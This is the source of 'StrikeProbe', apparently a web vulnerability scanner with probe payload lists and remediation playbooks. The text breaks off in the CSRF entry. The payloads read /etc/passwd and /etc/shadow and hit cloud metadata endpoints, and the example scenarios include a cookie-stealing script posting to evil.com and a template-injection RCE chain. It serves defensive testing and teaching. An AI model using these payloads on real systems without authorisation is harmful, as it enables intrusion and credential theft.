"""
StrikeProbe v3.1 — Enterprise-Grade Non-Destructive Web Vulnerability Scanner.

Covers the full OWASP Top 10:2025 with 16 detection modules, CVSS-like scoring,
detailed remediation playbooks, deep exploitation phase (password-gated), and
HTML export.
(All tests are read-only probes. No data is modified, deleted, or injected
into the target's persistent storage.)
"""

import argparse
import getpass
import hashlib
import html as html_module
import json
import logging
import os
import re
import socket
import sys
import time
import base64

if sys.platform == "win32":
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import (
    urlparse, urljoin, parse_qs, urlencode, urlunparse, quote,
)

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────
VERSION = "3.1.0"

BANNER = r"""
 ____  _        _ _        ____            _
/ ___|| |_ _ __(_) | _____|  _ \ _ __ ___ | |__   ___
\___ \| __| '__| | |/ / _ \ |_) | '__/ _ \| '_ \ / _ \
 ___) | |_| |  | |   <  __/  __/| | | (_) | |_) |  __/
|____/ \__|_|  |_|_|\_\___|_|   |_|  \___/|_.__/ \___|
  Enterprise Non-Destructive Vulnerability Scanner  v{}
             — OWASP Top 10:2025 Coverage —
         Deep Exploit Phase: password-protected 🔒
""".format(VERSION)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36"
)

# SHA-256 of the exploitation phase password
EXPLOIT_PASSWORD_HASH = "dc8f0a05ea634d20da0d1e2c620820683bc77d09720f02d227bfd954e164d87d"

# ─────────────────────────────────────────────
# Security Header Baselines
# ─────────────────────────────────────────────
SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "Cross-Origin-Embedder-Policy",
    "X-XSS-Protection",
]

INFO_DISCLOSURE_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version",
    "X-AspNetMvc-Version", "X-Generator", "X-Drupal-Cache",
]

COOKIE_FLAGS = ["Secure", "HttpOnly", "SameSite"]

# ─────────────────────────────────────────────
# Payloads
# ─────────────────────────────────────────────
XSS_PAYLOADS = [
    "<strikeprobe_test_tag>",
    '<img src=x onerror="strikeprobe">',
    "javascript:strikeprobe()",
    '"><strikeprobe>',
    "'-strikeprobe-'",
    "<svg/onload=strikeprobe>",
    "{{strikeprobe_test}}",
    "<details open ontoggle=strikeprobe>",
]

SQLI_PAYLOAD = "'"
SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "mysql_fetch", "warning: mysql",
    "unclosed quotation mark after the character string",
    "mysqli_", "mysql_num_rows", "mysql_query",
    "pg::syntaxerror", "error:  syntax error at or near",
    "valid postgresql result", "pg_query", "pg_exec",
    "sqlite_error", "sqlite3.operationalerror",
    "unrecognized token", "sqlite3::sqlexception",
    "microsoft sql native client error", "mssql_query()",
    "odbc sql server driver", "microsoft ole db provider for sql server",
    "ora-01756", "ora-00933", "oracle error", "ora-06512", "ora-01722",
    "sql syntax", "syntax error", "database error",
    "sql command not properly ended", "division by zero",
    "unterminated quoted string", "quoted string not properly terminated",
]

SSTI_PAYLOADS = [
    {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2/Twig"},
    {"payload": "${7*7}", "expected": "49", "engine": "FreeMarker/Velocity/Mako"},
    {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB/JSP"},
    {"payload": "#{7*7}", "expected": "49", "engine": "Ruby/Java EL"},
    {"payload": "{{7*'7'}}", "expected": "7777777", "engine": "Jinja2 (confirmed)"},
    {"payload": "@(1+1)", "expected": "2", "engine": "Razor"},
]

CMDI_PAYLOADS = [
    {"payload": "; echo STRIKEPROBE_CMD_MARKER", "marker": "STRIKEPROBE_CMD_MARKER", "os": "Linux"},
    {"payload": "| echo STRIKEPROBE_CMD_MARKER", "marker": "STRIKEPROBE_CMD_MARKER", "os": "Linux"},
    {"payload": "$(echo STRIKEPROBE_CMD_MARKER)", "marker": "STRIKEPROBE_CMD_MARKER", "os": "Linux"},
    {"payload": "& echo STRIKEPROBE_CMD_MARKER", "marker": "STRIKEPROBE_CMD_MARKER", "os": "Windows"},
]

PATH_TRAVERSAL_PAYLOADS = [
    {"payload": "../../../../etc/passwd", "evidence": ["root:x:", "root:*:"], "os": "Unix"},
    {"payload": "..\\..\\..\\..\\windows\\win.ini", "evidence": ["[fonts]", "[extensions]"], "os": "Windows"},
    {"payload": "....//....//....//....//etc/passwd", "evidence": ["root:x:"], "os": "Unix"},
    {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "evidence": ["root:x:"], "os": "Unix"},
    {"payload": "/etc/passwd%00.jpg", "evidence": ["root:x:"], "os": "Unix"},
    {"payload": "../../../../etc/shadow", "evidence": ["root:$", "root:!"], "os": "Unix"},
]

SSRF_TARGETS = [
    {"url": "http://127.0.0.1", "description": "Localhost loopback"},
    {"url": "http://localhost", "description": "Localhost hostname"},
    {"url": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata"},
    {"url": "http://metadata.google.internal/", "description": "GCP metadata"},
    {"url": "http://169.254.169.254/metadata/instance", "description": "Azure metadata"},
    {"url": "http://127.0.0.1:6379", "description": "Local Redis port"},
    {"url": "http://127.0.0.1:3306", "description": "Local MySQL port"},
]

REDIRECT_PARAMS = [
    "url", "redirect", "next", "goto", "return", "returnto", "return_to",
    "redir", "redirect_url", "redirect_uri", "destination", "dest",
    "continue", "target", "link", "out", "view", "ref", "callback",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:strikeprobe=injected",
    "%0d%0aX-Injected:strikeprobe",
    "%0d%0a%0d%0a<strikeprobe>crlf</strikeprobe>",
    "\r\nX-Injected: strikeprobe",
]

COMMON_PATHS = [
    "/robots.txt", "/sitemap.xml", "/.env", "/.git/config",
    "/admin", "/admin/", "/administrator", "/wp-admin",
    "/api", "/api/v1", "/api/v2", "/graphql",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/phpinfo.php", "/info.php", "/server-status",
    "/.well-known/security.txt", "/security.txt",
    "/wp-json/wp/v2/users", "/xmlrpc.php",
    "/backup", "/db", "/debug", "/trace",
    "/.htaccess", "/.htpasswd", "/web.config",
    "/config.json", "/config.yml", "/config.xml",
    "/actuator", "/actuator/health", "/actuator/env",
    "/console", "/elmah.axd", "/_debug",
]

TAKEOVER_FINGERPRINTS = {
    "s3.amazonaws.com": "NoSuchBucket",
    "herokuapp.com": "no such app",
    "github.io": "There isn't a GitHub Pages site here",
    "azurewebsites.net": "404 Web Site not found",
    "cloudfront.net": "Bad Request",
    "surge.sh": "project not found",
    "readme.io": "Project doesnt exist",
    "zendesk.com": "Help Center Closed",
}

KNOWN_VERSION_ISSUES = {
    "PHP/5.": {"severity": "CRITICAL", "detail": "PHP 5.x is END OF LIFE — no security patches since Dec 2018. Hundreds of known CVEs."},
    "PHP/7.": {"severity": "HIGH", "detail": "PHP 7.x is end of life. Multiple known CVEs. Upgrade to PHP 8.2+."},
    "PHP/8.0": {"severity": "MEDIUM", "detail": "PHP 8.0 is end of life since Nov 2023. Upgrade to 8.2+."},
    "Apache/2.2": {"severity": "CRITICAL", "detail": "Apache 2.2 is end of life. Known RCE vulnerabilities exist."},
    "Microsoft-IIS/7": {"severity": "HIGH", "detail": "IIS 7 runs on Windows Server 2008 (end of life). Critical vulns exist."},
    "Microsoft-IIS/8": {"severity": "MEDIUM", "detail": "IIS 8/8.5 on Server 2012 — approaching end of support."},
}

# ─────────────────────────────────────────────
# Rich Remediation Playbooks with CODE EXAMPLES
# ─────────────────────────────────────────────
REMEDIATION = {
    "xss": {
        "severity": "HIGH", "cvss": 7.5,
        "cwe": "CWE-79", "owasp": "A05:2025 Injection",
        "what": "Reflected Cross-Site Scripting (XSS)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Attacker crafts: https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n"
            "  Victim clicks link → their session cookie is silently exfiltrated → account hijacked."
        ),
        "risk": (
            "User input is reflected in the page WITHOUT sanitisation. An attacker "
            "can craft a malicious link that executes arbitrary JavaScript in the "
            "victim's browser — stealing cookies, hijacking sessions, or injecting "
            "phishing forms into trusted pages."
        ),
        "impact": [
            "Session hijacking — attacker takes over logged-in user accounts",
            "Credential theft — fake login forms injected into trusted pages",
            "Malware distribution — victims redirected to exploit kits",
            "Data exfiltration — sensitive page content sent to attacker's server",
            "Keylogging — attacker captures every keystroke on the page",
        ],
        "fix": (
            "1. ENCODE all user input before rendering in HTML (context-aware encoding)\n"
            "2. Implement Content-Security-Policy to block inline scripts\n"
            "3. Use framework auto-escaping (Django: {{ var }}, React: JSX curly braces)\n"
            "4. Sanitise rich HTML input with DOMPurify or Bleach\n"
            "5. Set HttpOnly flag on session cookies to block JS access"
        ),
        "code_example": (
            "# ❌ VULNERABLE (Python/Flask):\n"
            "return f'<h1>Hello {request.args[\"name\"]}!</h1>'  # Raw input in HTML!\n\n"
            "# ✅ SAFE — Output encoding:\n"
            "from markupsafe import escape\n"
            "return f'<h1>Hello {escape(request.args[\"name\"])}!</h1>'\n\n"
            "# ✅ SAFE — DOMPurify (JavaScript):\n"
            "const clean = DOMPurify.sanitize(userInput);\n"
            "document.getElementById('output').innerHTML = clean;\n\n"
            "# ✅ SAFE — PHP:\n"
            "echo '<h1>Hello ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '</h1>';\n\n"
            "# ✅ SAFE — Content-Security-Policy header:\n"
            "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            "https://github.com/cure53/DOMPurify",
        ],
    },
    "sqli": {
        "severity": "CRITICAL", "cvss": 9.8,
        "cwe": "CWE-89", "owasp": "A05:2025 Injection",
        "what": "SQL Injection (Error-Based / UNION-Based)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Login form: username=admin'-- and password=anything\n"
            "  Query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='anything'\n"
            "  The '--' comments out the password check → attacker logs in as admin with NO password!"
        ),
        "risk": (
            "User input is concatenated directly into SQL queries. An attacker can "
            "bypass authentication, dump the entire database, or even execute OS commands."
        ),
        "impact": [
            "Full database extraction — all tables, users, hashed passwords dumped",
            "Authentication bypass — login as any user without credentials",
            "Data manipulation — modify prices, permissions, financial records",
            "Server compromise — OS command execution via xp_cmdshell / LOAD_FILE",
        ],
        "fix": (
            "1. Use PARAMETERISED QUERIES (prepared statements) for ALL database calls\n"
            "2. NEVER concatenate user input into SQL strings\n"
            "3. Use an ORM (SQLAlchemy, Django ORM, Hibernate)\n"
            "4. Apply least-privilege to database accounts (no DROP, no xp_cmdshell)\n"
            "5. Implement a WAF as defence-in-depth (not as primary mitigation)"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "query = 'SELECT * FROM users WHERE username = \\'' + username + '\\'' \n"
            "cursor.execute(query)  # SQL Injection possible!\n\n"
            "# ✅ SAFE — Python (parameterised):\n"
            "cursor.execute('SELECT * FROM users WHERE username = %s', (username,))\n\n"
            "# ✅ SAFE — Java (PreparedStatement):\n"
            "PreparedStatement ps = conn.prepareStatement(\n"
            "    'SELECT * FROM users WHERE username = ?');\n"
            "ps.setString(1, username);\n\n"
            "# ✅ SAFE — PHP PDO:\n"
            "$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u');\n"
            "$stmt->execute(['u' => $username]);\n\n"
            "# ✅ SAFE — Django ORM (auto-parameterised):\n"
            "User.objects.filter(username=username)  # ORM handles escaping"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
    },
    "ssti": {
        "severity": "CRITICAL", "cvss": 9.8,
        "cwe": "CWE-1336", "owasp": "A05:2025 Injection",
        "what": "Server-Side Template Injection (SSTI)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  User enters name: {{7*7}} → page shows 49 (template evaluated it!)\n"
            "  Attacker then uses: {{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}}\n"
            "  Server executes 'id' and returns: uid=0(root) — full RCE achieved!"
        ),
        "risk": (
            "User input is passed directly into a server-side template engine. "
            "Attackers can inject template expressions to execute arbitrary code on the server."
        ),
        "impact": [
            "Remote Code Execution — full server takeover",
            "File system access — read /etc/shadow, .env, private keys",
            "Internal network pivoting via the compromised server",
            "Data destruction — delete databases, wipe files",
        ],
        "fix": (
            "1. NEVER render() user input directly as a template\n"
            "2. Use Jinja2 SandboxedEnvironment for untrusted template strings\n"
            "3. Use logic-less templates (Mustache/Handlebars) where possible\n"
            "4. Validate and allowlist all template context variables\n"
            "5. Run the template engine as a low-privilege process"
        ),
        "code_example": (
            "# ❌ VULNERABLE (Jinja2/Flask):\n"
            "from jinja2 import Template\n"
            "tmpl = Template(request.args['name'])  # User controls the TEMPLATE!\n"
            "return tmpl.render()\n\n"
            "# ✅ SAFE — Pass data AS CONTEXT, not as template:\n"
            "from flask import render_template_string\n"
            "return render_template_string('Hello {{ name }}', name=request.args['name'])\n\n"
            "# ✅ SAFE — Sandboxed environment for truly dynamic templates:\n"
            "from jinja2.sandbox import SandboxedEnvironment\n"
            "env = SandboxedEnvironment()\n"
            "result = env.from_string('Hello {{ name }}').render(name=user_input)"
        ),
        "references": [
            "https://portswigger.net/research/server-side-template-injection",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
        ],
    },
    "cmdi": {
        "severity": "CRITICAL", "cvss": 9.8,
        "cwe": "CWE-78", "owasp": "A05:2025 Injection",
        "what": "OS Command Injection",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Ping tool: /ping?host=google.com → runs: ping google.com\n"
            "  Attacker sends: /ping?host=google.com; cat /etc/shadow\n"
            "  Server runs: ping google.com; cat /etc/shadow → password hashes exposed!"
        ),
        "risk": (
            "User input is passed to OS commands without sanitisation. "
            "Attackers chain additional commands to read files, install backdoors, or pivot internally."
        ),
        "impact": [
            "Full server compromise — arbitrary command execution",
            "Data theft — read /etc/shadow, .env files, database credentials",
            "Backdoor installation — persistent access even after patching",
            "Lateral movement — attack internal services from the compromised host",
        ],
        "fix": (
            "1. NEVER use os.system(), exec(), or shell=True with user-controlled input\n"
            "2. Use subprocess with a list of arguments (shell=False is default)\n"
            "3. Implement strict input validation with allowlists (only allow known-good values)\n"
            "4. Run processes with minimal OS privileges (non-root, chroot, container)\n"
            "5. Prefer built-in language libraries over shelling out (e.g. use socket library, not ping)"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "import os\n"
            "os.system(f'ping {request.args[\"host\"]}')  # ; rm -rf / is valid here!\n\n"
            "# ❌ ALSO VULNERABLE:\n"
            "subprocess.run(f'ping {host}', shell=True)  # shell=True is dangerous\n\n"
            "# ✅ SAFE — List arguments, no shell:\n"
            "import subprocess, re\n"
            "host = request.args.get('host', '')\n"
            "if not re.match(r'^[a-zA-Z0-9._-]+$', host):  # Allowlist validation\n"
            "    abort(400)\n"
            "result = subprocess.run(['ping', '-c', '3', host],\n"
            "                        shell=False, capture_output=True, timeout=10)\n\n"
            "# ✅ BEST — Use a native library instead of shelling out:\n"
            "import socket\n"
            "ip = socket.gethostbyname(host)  # No shell, no injection risk"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        ],
    },
    "path_traversal": {
        "severity": "HIGH", "cvss": 7.5,
        "cwe": "CWE-22", "owasp": "A01:2025 Broken Access Control",
        "what": "Path Traversal / Local File Inclusion (LFI)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  File download: /download?file=report.pdf → serves /uploads/report.pdf\n"
            "  Attacker sends: /download?file=../../../../etc/passwd\n"
            "  Server returns the system password file — usernames and hashed passwords exposed!"
        ),
        "risk": (
            "User input is used to construct file paths without validation. "
            "Attackers use ../ sequences to escape the intended directory."
        ),
        "impact": [
            "Sensitive file disclosure — /etc/passwd, .env files, source code",
            "Configuration exposure — database credentials, API keys, certificates",
            "Escalation to RCE — via log poisoning or PHP file inclusion chains",
        ],
        "fix": (
            "1. Canonicalise the path and verify it stays within the allowed root directory\n"
            "2. Reject input containing ../ or ..\\ sequences immediately\n"
            "3. Use an allowlist of permitted filenames (never accept arbitrary paths)\n"
            "4. Store files with server-generated names (UUIDs), not user-supplied names\n"
            "5. Run file serving with minimal OS permissions (chroot or container)"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "filename = request.args.get('file')\n"
            "with open(f'/uploads/{filename}') as f:  # ../../../../etc/passwd works!\n"
            "    return f.read()\n\n"
            "# ✅ SAFE — Path validation:\n"
            "import os\n"
            "BASE_DIR = os.path.realpath('/uploads')\n"
            "filename = request.args.get('file', '')\n"
            "# Resolve the full path (expands all ../ sequences)\n"
            "safe_path = os.path.realpath(os.path.join(BASE_DIR, filename))\n"
            "# Verify it is still inside the allowed directory\n"
            "if not safe_path.startswith(BASE_DIR + os.sep):\n"
            "    abort(403, 'Access denied — path traversal detected')\n"
            "with open(safe_path) as f:\n"
            "    return f.read()\n\n"
            "# ✅ BEST — Use a UUID filename map (no user input in path at all):\n"
            "FILE_MAP = {'abc123': '/uploads/report.pdf'}  # Map IDs → real paths\n"
            "path = FILE_MAP.get(request.args.get('id'))\n"
            "if not path: abort(404)"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/Path_Traversal",
        ],
    },
    "ssrf": {
        "severity": "HIGH", "cvss": 8.6,
        "cwe": "CWE-918", "owasp": "A01:2025 Broken Access Control",
        "what": "Server-Side Request Forgery (SSRF)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  URL fetcher: /fetch?url=https://external-site.com\n"
            "  Attacker sends: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  Server (running on AWS) fetches its own metadata → AWS access keys returned to attacker!"
        ),
        "risk": (
            "The application makes HTTP requests to URLs specified by user input. "
            "Attackers force the server to access internal services or cloud metadata."
        ),
        "impact": [
            "Cloud credential theft — AWS/GCP/Azure access keys via metadata API",
            "Internal service access — databases, admin panels, Kubernetes API",
            "Firewall bypass — reach services blocked from the internet",
            "Internal port scanning — map internal network topology",
        ],
        "fix": (
            "1. Allowlist permitted destination hosts and protocols\n"
            "2. Resolve DNS and block requests to private/internal IP ranges\n"
            "3. Disable HTTP redirects or validate each redirect target\n"
            "4. Use a dedicated egress proxy for all outbound requests\n"
            "5. Apply IMDSv2 (token-based) on AWS to protect the metadata service"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "import requests\n"
            "url = request.args.get('url')\n"
            "data = requests.get(url).text  # Fetches ANYTHING, including internal services!\n\n"
            "# ✅ SAFE — Block private IP ranges:\n"
            "import ipaddress, socket\n"
            "from urllib.parse import urlparse\n"
            "\n"
            "ALLOWED_HOSTS = {'api.example.com', 'cdn.example.com'}\n"
            "\n"
            "def is_safe_url(url):\n"
            "    parsed = urlparse(url)\n"
            "    host = parsed.hostname\n"
            "    if host not in ALLOWED_HOSTS:\n"
            "        return False  # Not in allowlist\n"
            "    try:\n"
            "        ip = socket.gethostbyname(host)\n"
            "        addr = ipaddress.ip_address(ip)\n"
            "        if addr.is_private or addr.is_loopback or addr.is_link_local:\n"
            "            return False  # Block internal IPs\n"
            "    except Exception:\n"
            "        return False\n"
            "    return True\n"
            "\n"
            "url = request.args.get('url')\n"
            "if not is_safe_url(url):\n"
            "    abort(403)"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        ],
    },
    "open_redirect": {
        "severity": "MEDIUM", "cvss": 5.4,
        "cwe": "CWE-601", "owasp": "A01:2025 Broken Access Control",
        "what": "Open Redirect",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Login redirect: https://mybank.com/login?next=https://evil.com/fake-login\n"
            "  Victim sees the trusted mybank.com domain in the URL, clicks the link,\n"
            "  gets silently redirected to a cloned phishing page and enters their credentials."
        ),
        "risk": (
            "Redirect targets are not validated — attackers create trusted-looking links "
            "that redirect victims to phishing or malware sites."
        ),
        "impact": [
            "Phishing — victims trust the original legitimate domain in the URL",
            "OAuth token theft — hijack auth codes via redirect_uri manipulation",
            "Malware delivery — redirect to exploit kit landing pages",
        ],
        "fix": (
            "1. Only allow relative redirect paths (starting with /)\n"
            "2. Validate the destination host against a strict allowlist\n"
            "3. Show an interstitial warning page for external redirects\n"
            "4. Use opaque tokens that map to pre-registered redirect URIs"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "next_url = request.args.get('next')\n"
            "return redirect(next_url)  # Redirects to any URL including https://evil.com!\n\n"
            "# ✅ SAFE — Force relative paths only:\n"
            "from urllib.parse import urlparse\n"
            "next_url = request.args.get('next', '/')\n"
            "# Block absolute URLs (must start with / and not //)\n"
            "if not next_url.startswith('/') or next_url.startswith('//'):\n"
            "    next_url = '/'\n"
            "return redirect(next_url)\n\n"
            "# ✅ SAFE — Allowlist approach:\n"
            "ALLOWED_HOSTS = {'app.example.com', 'admin.example.com'}\n"
            "parsed = urlparse(next_url)\n"
            "if parsed.netloc and parsed.netloc not in ALLOWED_HOSTS:\n"
            "    next_url = '/'\n"
            "return redirect(next_url)"
        ),
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
        ],
    },
    "cors": {
        "severity": "HIGH", "cvss": 7.5,
        "cwe": "CWE-942", "owasp": "A02:2025 Security Misconfiguration",
        "what": "CORS Misconfiguration",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  API reflects any Origin: https://evil.com sends request with credentials,\n"
            "  server responds: Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true\n"
            "  Malicious script on evil.com now reads the victim's private API data with their session!"
        ),
        "risk": (
            "The server reflects arbitrary Origin headers, enabling any website to "
            "make authenticated requests and read responses from your application."
        ),
        "impact": [
            "Data theft — any website reads user data via authenticated API calls",
            "Account takeover — steal tokens, session data, personal information",
            "Mass automated attacks from any origin using victim credentials",
        ],
        "fix": (
            "1. Maintain a server-side allowlist of trusted origins\n"
            "2. NEVER reflect the Origin header back blindly\n"
            "3. NEVER combine Access-Control-Allow-Origin: * with Allow-Credentials: true\n"
            "4. Add Vary: Origin so caches don't serve one origin's response to another"
        ),
        "code_example": (
            "# ❌ VULNERABLE — reflects any origin:\n"
            "origin = request.headers.get('Origin')\n"
            "response.headers['Access-Control-Allow-Origin'] = origin  # Mirrors back anything!\n"
            "response.headers['Access-Control-Allow-Credentials'] = 'true'\n\n"
            "# ✅ SAFE — Server-side allowlist:\n"
            "ALLOWED_ORIGINS = {\n"
            "    'https://app.example.com',\n"
            "    'https://admin.example.com',\n"
            "}\n"
            "origin = request.headers.get('Origin', '')\n"
            "if origin in ALLOWED_ORIGINS:\n"
            "    response.headers['Access-Control-Allow-Origin'] = origin\n"
            "    response.headers['Access-Control-Allow-Credentials'] = 'true'\n"
            "    response.headers['Vary'] = 'Origin'  # Important for caching!\n"
            "# If origin is NOT in the list, do NOT set ACAO header at all"
        ),
        "references": [
            "https://portswigger.net/web-security/cors",
        ],
    },
    "crlf": {
        "severity": "HIGH", "cvss": 7.2,
        "cwe": "CWE-113", "owasp": "A05:2025 Injection",
        "what": "CRLF Injection / HTTP Response Splitting",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Redirect: /redirect?url=https://safe.com%0d%0aSet-Cookie:session=stolen\n"
            "  Server injects: Location: https://safe.com\\r\\nSet-Cookie: session=stolen\n"
            "  Victim's browser sets the attacker's session cookie — session fixation attack!"
        ),
        "risk": (
            "CR/LF characters in user input included in response headers allow "
            "attackers to inject headers or split responses."
        ),
        "impact": [
            "Session fixation — inject malicious Set-Cookie headers",
            "Cache poisoning — inject malicious content into CDN caches",
            "Security header bypass — override CSP or other protections via injected headers",
        ],
        "fix": (
            "1. Strip or reject \\r (CR) and \\n (LF) from all header values\n"
            "2. Use framework methods that auto-encode header values\n"
            "3. Use HTTP/2 end-to-end (immune to classic response splitting)\n"
            "4. Validate redirect URLs and cookie values rigorously"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "location = request.args.get('url')\n"
            "response.headers['Location'] = location  # CRLF injection possible!\n\n"
            "# ✅ SAFE — Strip CRLF characters:\n"
            "import re\n"
            "location = request.args.get('url', '/')\n"
            "location = re.sub(r'[\\r\\n]', '', location)  # Remove CR and LF\n"
            "response.headers['Location'] = location\n\n"
            "# ✅ SAFE — Use framework redirect (auto-sanitises):\n"
            "from flask import redirect\n"
            "return redirect(validated_url)  # Flask sanitises header values"
        ),
        "references": [
            "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
        ],
    },
    "host_header": {
        "severity": "MEDIUM", "cvss": 5.4,
        "cwe": "CWE-644", "owasp": "A02:2025 Security Misconfiguration",
        "what": "Host Header Injection",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Password reset email uses: Host: evil.com injected by attacker\n"
            "  Victim receives email: 'Click https://evil.com/reset?token=abc123'\n"
            "  Victim clicks → attacker captures the reset token → account taken over!"
        ),
        "risk": (
            "The application trusts the Host header for URL generation. "
            "Attackers poison reset emails and cached pages."
        ),
        "impact": [
            "Password reset poisoning — reset links point to attacker's server",
            "Cache poisoning — cache serves attacker-controlled host in responses",
        ],
        "fix": (
            "1. Never use request.host for URL generation — use a configured constant\n"
            "2. Validate the Host header against a strict allowlist\n"
            "3. Ignore X-Forwarded-Host unless from a trusted proxy IP\n"
            "4. Configure the web server to reject unrecognised Host values"
        ),
        "code_example": (
            "# ❌ VULNERABLE:\n"
            "host = request.headers.get('Host')  # Attacker controls this!\n"
            "reset_url = f'https://{host}/reset?token={token}'\n"
            "send_email(user.email, reset_url)  # Email contains evil.com link!\n\n"
            "# ✅ SAFE — Use hardcoded/env-configured domain:\n"
            "import os\n"
            "APP_DOMAIN = os.environ['APP_DOMAIN']  # e.g. 'myapp.com' — never from request\n"
            "reset_url = f'https://{APP_DOMAIN}/reset?token={token}'\n"
            "send_email(user.email, reset_url)\n\n"
            "# ✅ SAFE — Nginx: reject unknown Host headers:\n"
            "# server { listen 80 default_server; return 444; }  # Drop unknown hosts\n"
            "# server { server_name myapp.com; ... }  # Only accept known host"
        ),
        "references": [
            "https://portswigger.net/web-security/host-header",
        ],
    },
    "xxe": {
        "severity": "CRITICAL", "cvss": 9.1,
        "cwe": "CWE-611", "owasp": "A05:2025 Injection",
        "what": "XML External Entity (XXE) Injection",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  SOAP API accepts XML. Attacker sends:\n"
            "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\n"
            "  Server parses the entity → returns full contents of /etc/passwd to the attacker!"
        ),
        "risk": (
            "The XML parser processes external entity declarations in user-supplied XML, "
            "enabling file disclosure, SSRF, or denial-of-service."
        ),
        "impact": [
            "File disclosure — /etc/passwd, /etc/shadow, .env, application source code",
            "SSRF — proxy internal network requests through the XML parser",
            "Denial of Service — XML bomb (Billion Laughs) crashes the server",
        ],
        "fix": (
            "1. Disable DTD processing entirely in your XML parser\n"
            "2. Use defusedxml (Python) or safe parser configs (Java)\n"
            "3. Reject XML input containing DOCTYPE declarations\n"
            "4. Consider using JSON APIs instead of XML where possible"
        ),
        "code_example": (
            "# ❌ VULNERABLE (Python lxml):\n"
            "from lxml import etree\n"
            "tree = etree.parse(user_xml_file)  # Processes external entities!\n\n"
            "# ✅ SAFE — defusedxml blocks all XXE:\n"
            "import defusedxml.ElementTree as ET\n"
            "tree = ET.parse(user_xml_file)  # External entities and DTDs blocked\n\n"
            "# ✅ SAFE — Java: disable external entities:\n"
            "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n"
            "dbf.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true);\n"
            "dbf.setFeature('http://xml.org/sax/features/external-general-entities', false);\n"
            "dbf.setFeature('http://xml.org/sax/features/external-parameter-entities', false);\n\n"
            "# ✅ SAFE — PHP: use libxml_disable_entity_loader:\n"
            "libxml_disable_entity_loader(true);\n"
            "$doc = simplexml_load_string($xml);"
        ),
        "references": [
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://github.com/tiran/defusedxml",
        ],
    },
    "csrf": {
        "severity": "MEDIUM", "cvss": 6.5,
        "cwe": "CWE-352", "owasp": "A01:2025 Broken Access Control",
        "what": "Cross-Site Request Forgery (CSRF)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Attacker puts on evil.com: <img src='https://bank.com/transfer?to=attacker&amount=5000'>\n"
            "  Victim who is logged into bank.com visits evil.com\n"
